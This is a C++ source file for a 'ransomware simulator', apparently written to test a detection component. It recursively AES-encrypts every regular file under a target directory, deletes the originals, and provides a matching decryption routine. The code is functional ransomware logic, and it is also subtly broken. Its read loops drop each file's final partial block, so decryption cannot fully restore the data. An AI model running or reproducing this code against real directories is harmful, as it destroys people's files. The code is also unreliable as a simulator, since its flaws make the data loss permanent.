// RansomwareSimulator.cpp
#include "ransomware_simulator.h"

RansomwareSimulator::RansomwareSimulator(EventDetector& detector, FileExtensionChecker& checker)
    : event_detector(detector), file_checker(checker) {}

void RansomwareSimulator::encrypt_file(const std::string& filepath) {
    std::ifstream input(filepath, std::ios::binary);
    std::ofstream output(filepath + ".enc", std::ios::binary);

    AES_KEY encrypt_key;
    AES_set_encrypt_key(reinterpret_cast<const unsigned char*>(encryption_key.c_str()), 128, &encrypt_key);

    unsigned char buffer[16];
    while (input.read(reinterpret_cast<char*>(buffer), sizeof(buffer))) {
        unsigned char encrypted_buffer[16];
        AES_encrypt(buffer, encrypted_buffer, &encrypt_key);
        output.write(reinterpret_cast<char*>(encrypted_buffer), sizeof(encrypted_buffer));
    }

    input.close();
    output.close();
    fs::remove(filepath); // Delete original file after encryption
}

void RansomwareSimulator::decrypt_file(const std::string& filepath) {
    std::ifstream input(filepath, std::ios::binary);
    std::ofstream output(filepath.substr(0, filepath.length() - 4), std::ios::binary);

    AES_KEY decrypt_key;
    AES_set_decrypt_key(reinterpret_cast<const unsigned char*>(encryption_key.c_str()), 128, &decrypt_key);

    unsigned char buffer[16];
    while (input.read(reinterpret_cast<char*>(buffer), sizeof(buffer))) {
        unsigned char decrypted_buffer[16];
        AES_decrypt(buffer, decrypted_buffer, &decrypt_key);
        output.write(reinterpret_cast<char*>(decrypted_buffer), sizeof(decrypted_buffer));
    }

    input.close();
    output.close();
    fs::remove(filepath); // Delete encrypted file after decryption
}

void RansomwareSimulator::simulate_attack(const std::string& target_directory) {
    for (const auto& entry : fs::recursive_directory_iterator(target_directory)) {
        if (entry.is_regular_file() && !file_checker.is_suspicious(entry.path().string())) {
            encrypt_file(entry.path().string());
            event_detector.log_event(Event("File Encrypted", entry.path().string()));
        }
    }
}

void RansomwareSimulator::simulate_decryption(const std::string& target_directory) {
    for (const auto& entry : fs::recursive_directory_iterator(target_directory)) {
        if (entry.is_regular_file() && entry.path().extension() == ".enc") {
            decrypt_file(entry.path().string());
            event_detector.log_event(Event("File Decrypted", entry.path().string()));
        }
    }
}
